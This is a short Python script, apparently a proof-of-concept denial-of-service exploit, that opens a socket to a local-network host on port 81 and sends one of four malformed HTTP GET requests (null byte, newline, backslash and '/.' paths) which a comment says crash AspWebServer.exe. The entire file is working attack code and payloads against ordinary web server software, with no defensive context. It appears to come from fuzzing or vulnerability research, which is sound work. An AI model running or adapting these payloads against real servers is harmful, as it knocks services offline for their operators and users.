import socket
host = '192.168.124.128'    
port = 81

# extracted four payloads from crashes that can crash the AspWebServer.exe
payload1 = 'GET /\ HTTP/1.1\r\n\r\n'
payload2 = 'GET \x00 HTTP/1.1\r\n\r\n'
payload3 = 'GET \n HTTP/1.1\r\n\r\n'
payload4 = 'GET /. HTTP/1.1\r\n\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(payload1)
s.close()
